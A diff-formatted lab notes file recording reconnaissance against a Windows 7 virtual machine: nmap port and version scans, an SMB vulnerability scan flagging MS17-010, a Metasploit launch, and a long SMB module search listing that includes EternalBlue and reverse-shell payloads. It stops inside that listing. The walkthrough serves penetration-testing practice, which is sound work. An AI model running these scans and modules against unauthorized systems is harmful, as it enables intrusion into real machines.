@@ -1,0 +1,773 @@
+Gaining Access window 7
+
+1. scan target port by nmap
+====================================================================================================
+msf6 > nmap -sS 192.168.150.128
+[*] exec: nmap -sS 192.168.150.128
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 00:48 EST
+Nmap scan report for 192.168.150.128
+Host is up (0.00096s latency).
+All 1000 scanned ports on 192.168.150.128 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+MAC Address: 00:0C:29:F5:6B:6B (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 21.50 seconds
+msf6 > search smb
+
+
+2. Scan target port by nmap after off window 7 firewall.
+=====================================================================================================                                                                                                                           
+┌──(kali㉿kali)-[~]
+└─$ nmap -sV 192.168.150.128        
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 01:28 EST
+Nmap scan report for 192.168.150.128
+Host is up (0.0043s latency).
+Not shown: 991 closed tcp ports (reset)
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+MAC Address: 00:0C:29:F5:6B:6B (VMware)
+Service Info: Host: WIN-MKNMHENOC7S; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.95 seconds
+ 
+
+3. We got target port 445 service microsoft-ds
+==========================================================================================================
+                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ nmap --script smb-vul* 192.168.150.128
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 01:34 EST
+Nmap scan report for 192.168.150.128
+Host is up (0.0046s latency).
+Not shown: 991 closed tcp ports (reset)
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+MAC Address: 00:0C:29:F5:6B:6B (VMware)
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:                                                                       -show it is vulnerables
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+
+Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds
+
+4. open metasoploitFramework
+============================================================================================================                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ msfconsole
+Metasploit tip: The use command supports fuzzy searching to try and 
+select the intended module, e.g. use kerberos/get_ticket or use 
+kerberos forge silver ticket
+                                                  
+
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm `?MMM             MMMM` dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+        https://metasploit.com
+
+
+       =[ metasploit v6.4.34-dev                          ]
++ -- --=[ 2461 exploits - 1267 auxiliary - 431 post       ]
++ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+================================================================================================================
+5. 
+
+msf6 > search smb
+
+Matching Modules
+================
+
+   #    Name                                                                            Disclosure Date  Rank       Check  Description
+   -    ----                                                                            ---------------  ----       -----  -----------
+   0    exploit/multi/http/struts_code_exec_classloader                                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   1      \_ target: Java                                                               .                .          .      .
+   2      \_ target: Linux                                                              .                .          .      .
+   3      \_ target: Windows                                                            .                .          .      .
+   4      \_ target: Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)       .                .          .      .
+   5    exploit/osx/browser/safari_file_policy                                          2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
+   6      \_ target: Safari 5.1 on OS X                                                 .                .          .      .
+   7      \_ target: Safari 5.1 on OS X with Java                                       .                .          .      .
+   8    auxiliary/server/capture/smb                                                    .                normal     No     Authentication Capture: SMB
+   9    post/linux/busybox/smb_share_root                                               .                normal     No     BusyBox SMB Sharing
+   10   exploit/linux/misc/cisco_rv340_sslvpn                                           2022-02-02       good       Yes    Cisco RV340 SSL VPN Unauthenticated Remote Code Execution
+   11   auxiliary/scanner/http/citrix_dir_traversal                                     2019-12-17       normal     No     Citrix ADC (NetScaler) Directory Traversal Scanner
+   12   auxiliary/gather/crushftp_fileread_cve_2024_4040                                .                normal     Yes    CrushFTP Unauthenticated Arbitrary File Read
+   13   auxiliary/scanner/smb/impacket/dcomexec                                         2018-03-19       normal     No     DCOM Exec
+   14   auxiliary/scanner/smb/impacket/secretsdump                                      .                normal     No     DCOM Exec
+   15   auxiliary/scanner/dcerpc/dfscoerce                                              .                normal     No     DFSCoerce
+   16   exploit/windows/scada/ge_proficy_cimplicity_gefebt                              2014-01-23       excellent  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
+   17   exploit/windows/smb/generic_smb_dll_injection                                   2015-03-04       manual     No     Generic DLL Injection From Shared Resource
+   18     \_ target: Windows x86                                                        .                .          .      .
+   19     \_ target: Windows x64                                                        .                .          .      .
+   20   exploit/windows/http/generic_http_dll_injection                                 2015-03-04       manual     No     Generic Web Application DLL Injection
+   21     \_ target: Windows x86                                                        .                .          .      .
+   22     \_ target: Windows x64                                                        .                .          .      .
+   23   exploit/windows/smb/group_policy_startup                                        2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
+   24     \_ target: Windows x86                                                        .                .          .      .
+   25     \_ target: Windows x64                                                        .                .          .      .
+   26   exploit/windows/misc/hp_dataprotector_install_service                           2011-11-02       excellent  Yes    HP Data Protector 6.10/6.11/6.20 Install Service
+   27   exploit/windows/misc/hp_dataprotector_cmd_exec                                  2014-11-02       excellent  Yes    HP Data Protector 8.10 Remote Command Execution
+   28   auxiliary/server/http_ntlmrelay                                                 .                normal     No     HTTP Client MS Credential Relayer
+   29   payload/cmd/windows/http/x64/custom/reverse_named_pipe                          .                normal     No     HTTP Fetch, Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager
+   30   payload/cmd/windows/http/x64/meterpreter/reverse_named_pipe                     .                normal     No     HTTP Fetch, Windows x64 Reverse Named Pipe (SMB) Stager
+   31   payload/cmd/windows/http/x64/peinject/reverse_named_pipe                        .                normal     No     HTTP Fetch, Windows x64 Reverse Named Pipe (SMB) Stager
+   32   payload/cmd/windows/https/x64/custom/reverse_named_pipe                         .                normal     No     HTTPS Fetch, Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager
+   33   payload/cmd/windows/https/x64/meterpreter/reverse_named_pipe                    .                normal     No     HTTPS Fetch, Windows x64 Reverse Named Pipe (SMB) Stager
+   34   payload/cmd/windows/https/x64/peinject/reverse_named_pipe                       .                normal     No     HTTPS Fetch, Windows x64 Reverse Named Pipe (SMB) Stager
+   35   exploit/windows/smb/ipass_pipe_exec                                             2015-01-21       excellent  Yes    IPass Control Pipe Remote Command Execution
+   36     \_ target: Windows x32                                                        .                .          .      .
+   37     \_ target: Windows x64                                                        .                .          .      .
+   38   auxiliary/gather/konica_minolta_pwd_extract                                     .                normal     No     Konica Minolta Password Extractor
+   39   auxiliary/fileformat/odt_badodt                                                 2018-05-01       normal     No     LibreOffice 6.03 /Apache OpenOffice 4.1.5 Malicious ODT File Generator
+   40   post/linux/gather/mount_cifs_creds                                              .                normal     No     Linux Gather Saved mount.cifs/mount.smbfs Credentials
+   41   exploit/windows/smb/ms03_049_netapi                                             2003-11-11       good       No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
+   42   exploit/windows/smb/ms04_007_killbill                                           2004-02-10       low        No     MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
+   43   exploit/windows/smb/ms04_011_lsass                                              2004-04-13       good       No     MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow
+   44     \_ target: Automatic Targetting                                               .                .          .      .
+   45     \_ target: Windows 2000 English                                               .                .          .      .
+   46     \_ target: Windows XP English                                                 .                .          .      .
+   47   exploit/windows/smb/ms04_031_netdde                                             2004-10-12       good       No     MS04-031 Microsoft NetDDE Service Overflow
+   48   exploit/windows/smb/ms05_039_pnp                                                2005-08-09       good       Yes    MS05-039 Microsoft Plug and Play Service Overflow
+   49     \_ target: Windows 2000 SP0-SP4                                               .                .          .      .
+   50     \_ target: Windows 2000 SP4 French                                            .                .          .      .
+   51     \_ target: Windows 2000 SP4 Spanish                                           .                .          .      .
+   52     \_ target: Windows 2000 SP4 Universal                                         .                .          .      .
+   53     \_ target: Windows 2000 SP0-SP4 German                                        .                .          .      .
+   54     \_ target: Windows 2000 SP0-SP4 Italian                                       .                .          .      .
+   55     \_ target: Windows XP SP1 English                                             .                .          .      .
+   56     \_ target: Windows XP SP2 English (Requires Admin)                            .                .          .      .
+   57     \_ target: Windows Server 2003 SP0 English (Requires Admin)                   .                .          .      .
+   58     \_ target: Windows Server 2003 SP1 English (Requires Admin)                   .                .          .      .
+   59   exploit/windows/smb/ms06_025_rras                                               2006-06-13       average    No     MS06-025 Microsoft RRAS Service Overflow
+   60     \_ target: Automatic                                                          .                .          .      .
+   61     \_ target: Windows 2000 SP4                                                   .                .          .      .
+   62     \_ target: Windows XP SP1                                                     .                .          .      .
+   63   exploit/windows/smb/ms06_025_rasmans_reg                                        2006-06-13       good       No     MS06-025 Microsoft RRAS Service RASMAN Registry Overflow
+   64   exploit/windows/smb/ms06_040_netapi                                             2006-08-08       good       No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
+   65     \_ target: (wcscpy) Automatic (NT 4.0, 2000 SP0-SP4, XP SP0-SP1)              .                .          .      .
+   66     \_ target: (wcscpy) Windows NT 4.0 / Windows 2000 SP0-SP4                     .                .          .      .
+   67     \_ target: (wcscpy) Windows XP SP0/SP1                                        .                .          .      .
+   68     \_ target: (stack)  Windows XP SP1 English                                    .                .          .      .
+   69     \_ target: (stack)  Windows XP SP1 Italian                                    .                .          .      .
+   70     \_ target: (wcscpy) Windows 2003 SP0                                          .                .          .      .
+   71   exploit/windows/smb/ms06_066_nwapi                                              2006-11-14       good       No     MS06-066 Microsoft Services nwapi32.dll Module Exploit
+   72   exploit/windows/smb/ms06_066_nwwks                                              2006-11-14       good       No     MS06-066 Microsoft Services nwwks.dll Module Exploit
+   73   exploit/windows/smb/ms06_070_wkssvc                                             2006-11-14       manual     No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
+   74     \_ target: Automatic Targetting                                               .                .          .      .
+   75     \_ target: Windows 2000 SP4                                                   .                .          .      .
+   76     \_ target: Windows XP SP0/SP1                                                 .                .          .      .
+   77   exploit/windows/smb/ms07_029_msdns_zonename                                     2007-04-12       manual     No     MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow (SMB)
+   78     \_ target: Automatic (2000 SP0-SP4, 2003 SP0-SP2)                             .                .          .      .
+   79     \_ target: Windows 2000 Server SP0-SP4+ English                               .                .          .      .
+   80     \_ target: Windows 2000 Server SP0-SP4+ French                                .                .          .      .
+   81     \_ target: Windows 2000 Server SP0-SP4+ German                                .                .          .      .
+   82     \_ target: Windows 2000 Server SP0-SP4+ Italian                               .                .          .      .
+   83     \_ target: Windows 2000 Server SP0-SP4+ Polish                                .                .          .      .
+   84     \_ target: Windows 2000 Server SP0-SP4+ Portuguese                            .                .          .      .
+   85     \_ target: Windows 2000 Server SP0-SP4+ Korean                                .                .          .      .
+   86     \_ target: Windows 2000 Server SP0-SP4+ Russian                               .                .          .      .
+   87     \_ target: Windows 2000 Server SP0-SP4+ Simplified Chinese                    .                .          .      .
+   88     \_ target: Windows 2000 Server SP0-SP4+ Spanish                               .                .          .      .
+   89     \_ target: Windows 2000 Server SP0-SP4+ Swedish                               .                .          .      .
+   90     \_ target: Windows 2000 Server SP0-SP4+ Traditional Chinese                   .                .          .      .
+   91     \_ target: Windows 2000 Server SP0-SP4+ Turkish                               .                .          .      .
+   92     \_ target: Windows 2003 Server SP0 English                                    .                .          .      .
+   93     \_ target: Windows 2003 Server SP0 French                                     .                .          .      .
+   94     \_ target: Windows 2003 Server SP1-SP2 English                                .                .          .      .
+   95     \_ target: Windows 2003 Server SP1-SP2 French                                 .                .          .      .
+   96     \_ target: Windows 2003 Server SP1-SP2 Spanish                                .                .          .      .
+   97     \_ target: Windows 2003 Server SP1-SP2 Italian                                .                .          .      .
+   98     \_ target: Windows 2003 Server SP1-SP2 German                                 .                .          .      .
+   99     \_ target: Windows 2003 Server SP1-SP2 Russian                                .                .          .      .
+   100    \_ target: Windows 2003 Server SP1-SP2 Simplified Chinese                     .                .          .      .
+   101  exploit/windows/smb/ms08_067_netapi                                             2008-10-28       great      Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
+   102    \_ target: Automatic Targeting                                                .                .          .      .
+   103    \_ target: Windows 2000 Universal                                             .                .          .      .
+   104    \_ target: Windows XP SP0/SP1 Universal                                       .                .          .      .
+   105    \_ target: Windows 2003 SP0 Universal                                         .                .          .      .
+   106    \_ target: Windows XP SP2 English (AlwaysOn NX)                               .                .          .      .
+   107    \_ target: Windows XP SP2 English (NX)                                        .                .          .      .
+   108    \_ target: Windows XP SP3 English (AlwaysOn NX)                               .                .          .      .
+   109    \_ target: Windows XP SP3 English (NX)                                        .                .          .      .
+   110    \_ target: Windows XP SP2 Arabic (NX)                                         .                .          .      .
+   111    \_ target: Windows XP SP2 Chinese - Traditional / Taiwan (NX)                 .                .          .      .
+   112    \_ target: Windows XP SP2 Chinese - Simplified (NX)                           .                .          .      .
+   113    \_ target: Windows XP SP2 Chinese - Traditional (NX)                          .                .          .      .
+   114    \_ target: Windows XP SP2 Czech (NX)                                          .                .          .      .
+   115    \_ target: Windows XP SP2 Danish (NX)                                         .                .          .      .
+   116    \_ target: Windows XP SP2 German (NX)                                         .                .          .      .
+   117    \_ target: Windows XP SP2 Greek (NX)                                          .                .          .      .
+   118    \_ target: Windows XP SP2 Spanish (NX)                                        .                .          .      .
+   119    \_ target: Windows XP SP2 Finnish (NX)                                        .                .          .      .
+   120    \_ target: Windows XP SP2 French (NX)                                         .                .          .      .
+   121    \_ target: Windows XP SP2 Hebrew (NX)                                         .                .          .      .
+   122    \_ target: Windows XP SP2 Hungarian (NX)                                      .                .          .      .
+   123    \_ target: Windows XP SP2 Italian (NX)                                        .                .          .      .
+   124    \_ target: Windows XP SP2 Japanese (NX)                                       .                .          .      .
+   125    \_ target: Windows XP SP2 Korean (NX)                                         .                .          .      .
+   126    \_ target: Windows XP SP2 Dutch (NX)                                          .                .          .      .
+   127    \_ target: Windows XP SP2 Norwegian (NX)                                      .                .          .      .
+   128    \_ target: Windows XP SP2 Polish (NX)                                         .                .          .      .
+   129    \_ target: Windows XP SP2 Portuguese - Brazilian (NX)                         .                .          .      .
+   130    \_ target: Windows XP SP2 Portuguese (NX)                                     .                .          .      .
+   131    \_ target: Windows XP SP2 Russian (NX)                                        .                .          .      .
+   132    \_ target: Windows XP SP2 Swedish (NX)                                        .                .          .      .
+   133    \_ target: Windows XP SP2 Turkish (NX)                                        .                .          .      .
+   134    \_ target: Windows XP SP3 Arabic (NX)                                         .                .          .      .
+   135    \_ target: Windows XP SP3 Chinese - Traditional / Taiwan (NX)                 .                .          .      .
+   136    \_ target: Windows XP SP3 Chinese - Simplified (NX)                           .                .          .      .
+   137    \_ target: Windows XP SP3 Chinese - Traditional (NX)                          .                .          .      .
+   138    \_ target: Windows XP SP3 Czech (NX)                                          .                .          .      .
+   139    \_ target: Windows XP SP3 Danish (NX)                                         .                .          .      .
+   140    \_ target: Windows XP SP3 German (NX)                                         .                .          .      .
+   141    \_ target: Windows XP SP3 Greek (NX)                                          .                .          .      .
+   142    \_ target: Windows XP SP3 Spanish (NX)                                        .                .          .      .
+   143    \_ target: Windows XP SP3 Finnish (NX)                                        .                .          .      .
+   144    \_ target: Windows XP SP3 French (NX)                                         .                .          .      .
+   145    \_ target: Windows XP SP3 Hebrew (NX)                                         .                .          .      .
+   146    \_ target: Windows XP SP3 Hungarian (NX)                                      .                .          .      .
+   147    \_ target: Windows XP SP3 Italian (NX)                                        .                .          .      .
+   148    \_ target: Windows XP SP3 Japanese (NX)                                       .                .          .      .
+   149    \_ target: Windows XP SP3 Korean (NX)                                         .                .          .      .
+   150    \_ target: Windows XP SP3 Dutch (NX)                                          .                .          .      .
+   151    \_ target: Windows XP SP3 Norwegian (NX)                                      .                .          .      .
+   152    \_ target: Windows XP SP3 Polish (NX)                                         .                .          .      .
+   153    \_ target: Windows XP SP3 Portuguese - Brazilian (NX)                         .                .          .      .
+   154    \_ target: Windows XP SP3 Portuguese (NX)                                     .                .          .      .
+   155    \_ target: Windows XP SP3 Russian (NX)                                        .                .          .      .
+   156    \_ target: Windows XP SP3 Swedish (NX)                                        .                .          .      .
+   157    \_ target: Windows XP SP3 Turkish (NX)                                        .                .          .      .
+   158    \_ target: Windows 2003 SP1 English (NO NX)                                   .                .          .      .
+   159    \_ target: Windows 2003 SP1 English (NX)                                      .                .          .      .
+   160    \_ target: Windows 2003 SP1 Japanese (NO NX)                                  .                .          .      .
+   161    \_ target: Windows 2003 SP1 Spanish (NO NX)                                   .                .          .      .
+   162    \_ target: Windows 2003 SP1 Spanish (NX)                                      .                .          .      .
+   163    \_ target: Windows 2003 SP1 French (NO NX)                                    .                .          .      .
+   164    \_ target: Windows 2003 SP1 French (NX)                                       .                .          .      .
+   165    \_ target: Windows 2003 SP2 English (NO NX)                                   .                .          .      .
+   166    \_ target: Windows 2003 SP2 English (NX)                                      .                .          .      .
+   167    \_ target: Windows 2003 SP2 German (NO NX)                                    .                .          .      .
+   168    \_ target: Windows 2003 SP2 German (NX)                                       .                .          .      .
+   169    \_ target: Windows 2003 SP2 Portuguese (NX)                                   .                .          .      .
+   170    \_ target: Windows 2003 SP2 Portuguese - Brazilian (NX)                       .                .          .      .
+   171    \_ target: Windows 2003 SP2 Spanish (NO NX)                                   .                .          .      .
+   172    \_ target: Windows 2003 SP2 Spanish (NX)                                      .                .          .      .
+   173    \_ target: Windows 2003 SP2 Japanese (NO NX)                                  .                .          .      .
+   174    \_ target: Windows 2003 SP2 French (NO NX)                                    .                .          .      .
+   175    \_ target: Windows 2003 SP2 French (NX)                                       .                .          .      .
+   176    \_ target: Windows 2003 SP2 Chinese - Simplified (NX)                         .                .          .      .
+   177    \_ target: Windows 2003 SP2 Czech (NX)                                        .                .          .      .
+   178    \_ target: Windows 2003 SP2 Dutch (NX)                                        .                .          .      .
+   179    \_ target: Windows 2003 SP2 Hungarian (NX)                                    .                .          .      .
+   180    \_ target: Windows 2003 SP2 Italian (NX)                                      .                .          .      .
+   181    \_ target: Windows 2003 SP2 Russian (NX)                                      .                .          .      .
+   182    \_ target: Windows 2003 SP2 Swedish (NX)                                      .                .          .      .
+   183    \_ target: Windows 2003 SP2 Turkish (NX)                                      .                .          .      .
+   184  exploit/windows/smb/smb_relay                                                   2001-03-31       excellent  No     MS08-068 Microsoft Windows SMB Relay Code Execution
+   185    \_ action: CREATE_SMB_SESSION                                                 .                .          .      Do not close the SMB connection after relaying, and instead create an SMB session
+   186    \_ action: PSEXEC                                                             .                .          .      Use the SMB Connection to run the exploit/windows/psexec module against the relay target
+   187    \_ target: Automatic                                                          .                .          .      .
+   188    \_ target: PowerShell                                                         .                .          .      .
+   189    \_ target: Native upload                                                      .                .          .      .
+   190    \_ target: MOF upload                                                         .                .          .      .
+   191    \_ target: Command                                                            .                .          .      .
+   192  exploit/windows/smb/ms09_050_smb2_negotiate_func_index                          2009-09-07       good       No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+   193  exploit/windows/browser/ms10_022_ie_vbscript_winhlp32                           2010-02-26       great      No     MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
+   194    \_ target: Automatic                                                          .                .          .      .
+   195    \_ target: Internet Explorer on Windows                                       .                .          .      .
+   196  exploit/windows/smb/ms10_061_spoolss                                            2010-09-14       excellent  No     MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability
+   197  exploit/windows/fileformat/ms13_071_theme                                       2013-09-10       excellent  No     MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution
+   198  exploit/windows/fileformat/ms14_060_sandworm                                    2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   199  exploit/windows/smb/ms17_010_eternalblue                                        2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   200    \_ target: Automatic Target                                                   .                .          .      .
+   201    \_ target: Windows 7                                                          .                .          .      .
+   202    \_ target: Windows Embedded Standard 7                                        .                .          .      .
+   203    \_ target: Windows Server 2008 R2                                             .                .          .      .
+   204    \_ target: Windows 8                                                          .                .          .      .
+   205    \_ target: Windows 8.1                                                        .                .          .      .
+   206    \_ target: Windows Server 2012                                                .                .          .      .
+   207    \_ target: Windows 10 Pro                                                     .                .          .      .
+   208    \_ target: Windows 10 Enterprise Evaluation                                   .                .          .      .
+   209  exploit/windows/smb/ms17_010_psexec                                             2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   210    \_ target: Automatic                                                          .                .          .      .
+   211    \_ target: PowerShell                                                         .                .          .      .
+   212    \_ target: Native upload                                                      .                .          .      .
+   213    \_ target: MOF upload                                                         .                .          .      .
+   214    \_ AKA: ETERNALSYNERGY                                                        .                .          .      .
+   215    \_ AKA: ETERNALROMANCE                                                        .                .          .      .
+   216    \_ AKA: ETERNALCHAMPION                                                       .                .          .      .
+   217    \_ AKA: ETERNALBLUE                                                           .                .          .      .
+   218  auxiliary/admin/smb/ms17_010_command                                            2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   219    \_ AKA: ETERNALSYNERGY                                                        .                .          .      .
+   220    \_ AKA: ETERNALROMANCE                                                        .                .          .      .
+   221    \_ AKA: ETERNALCHAMPION                                                       .                .          .      .
+   222    \_ AKA: ETERNALBLUE                                                           .                .          .      .
+   223  auxiliary/scanner/smb/smb_ms17_010                                              .                normal     No     MS17-010 SMB RCE Detection
+   224    \_ AKA: DOUBLEPULSAR                                                          .                .          .      .
+   225    \_ AKA: ETERNALBLUE                                                           .                .          .      .
+   226  auxiliary/dos/windows/smb/ms05_047_pnp                                          .                normal     No     Microsoft Plug and Play Service Registry Overflow
+   227  auxiliary/dos/windows/smb/rras_vls_null_deref                                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
+   228  auxiliary/admin/mssql/mssql_ntlm_stealer                                        .                normal     No     Microsoft SQL Server NTLM Stealer
+   229  auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                   .                normal     No     Microsoft SQL Server SQLi NTLM Stealer
+   230  auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                           .                normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
+   231  auxiliary/admin/mssql/mssql_enum_domain_accounts                                .                normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
+   232  auxiliary/dos/windows/smb/ms06_035_mailslot                                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
+   233  auxiliary/dos/windows/smb/ms06_063_trans                                        .                normal     No     Microsoft SRV.SYS Pipe Transaction No Null
+   234  auxiliary/dos/windows/smb/ms09_001_write                                        .                normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
+   235  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                       .                normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+   236  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                          .                normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
+   237  auxiliary/dos/windows/smb/vista_negotiate_stop                                  .                normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
+   238  auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                      .                normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
+   239  auxiliary/scanner/smb/psexec_loggedin_users                                     .                normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
+   240  exploit/windows/smb/psexec                                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
+   241    \_ target: Automatic                                                          .                .          .      .
+   242    \_ target: PowerShell                                                         .                .          .      .
+   243    \_ target: Native upload                                                      .                .          .      .
+   244    \_ target: MOF upload                                                         .                .          .      .
+   245    \_ target: Command                                                            .                .          .      .
+   246  auxiliary/dos/windows/smb/ms11_019_electbowser                                  .                normal     No     Microsoft Windows Browser Pool DoS
+   247  exploit/windows/smb/smb_rras_erraticgopher                                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
+   248    \_ target: Automatic                                                          .                .          .      .
+   249    \_ target: Windows Server 2003 SP0 (English)                                  .                .          .      .
+   250    \_ target: Windows Server 2003 SP1 (English) (NX)                             .                .          .      .
+   251    \_ target: Windows Server 2003 SP2 (English) (NX)                             .                .          .      .
+   252    \_ target: Windows Server 2003 R2 SP2 (English) (NX)                          .                .          .      .
+   253  exploit/windows/smb/smb_shadow                                                  2021-02-16       manual     No     Microsoft Windows SMB Direct Session Takeover
+   254  auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                        .                normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
+   255  exploit/windows/smb/ms10_046_shortcut_icon_dllloader                            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
+   256  exploit/windows/smb/ms15_020_shortcut_icon_dllloader                            2015-03-10       excellent  No     Microsoft Windows Shell LNK Code Execution
+   257  auxiliary/docx/word_unc_injector                                                .                normal     No     Microsoft Word UNC Path Injector
+   258  auxiliary/spoof/nbns/nbns_response                                              .                normal     No     NetBIOS Name Service Spoofer
+   259  exploit/windows/smb/netidentity_xtierrpcpipe                                    2009-04-06       great      No     Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow
+   260  exploit/netware/smb/lsass_cifs                                                  2007-01-21       average    No     Novell NetWare LSASS CIFS.NLM Driver Stack Buffer Overflow
+   261    \_ target: Automatic                                                          .                .          .      .
+   262    \_ target: VMware                                                             .                .          .      .
+   263    \_ target: NetWare 6.5 SP2                                                    .                .          .      .
+   264    \_ target: NetWare 6.5 SP3                                                    .                .          .      .
+   265    \_ target: NetWare 6.5 SP4                                                    .                .          .      .
+   266    \_ target: NetWare 6.5 SP5                                                    .                .          .      .
+   267    \_ target: NetWare 6.5 SP6                                                    .                .          .      .
+   268    \_ target: NetWare 6.5 SP7                                                    .                .          .      .
+   269  exploit/windows/oracle/extjob                                                   2007-01-01       excellent  Yes    Oracle Job Scheduler Named Pipe Command Execution
+   270  auxiliary/admin/oracle/ora_ntlm_stealer                                         2009-04-07       normal     No     Oracle SMB Relay Code Execution
+   271  auxiliary/scanner/dcerpc/petitpotam                                             .                normal     No     PetitPotam
+   272  payload/cmd/windows/powershell/x64/custom/reverse_named_pipe                    .                normal     No     Powershell Exec, Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager
+   273  payload/cmd/windows/powershell/custom/reverse_named_pipe                        .                normal     No     Powershell Exec, Windows shellcode stage, Windows x86 Reverse Named Pipe (SMB) Stager
+   274  payload/cmd/windows/powershell/x64/meterpreter/reverse_named_pipe               .                normal     No     Powershell Exec, Windows x64 Reverse Named Pipe (SMB) Stager
+   275  payload/cmd/windows/powershell/x64/peinject/reverse_named_pipe                  .                normal     No     Powershell Exec, Windows x64 Reverse Named Pipe (SMB) Stager
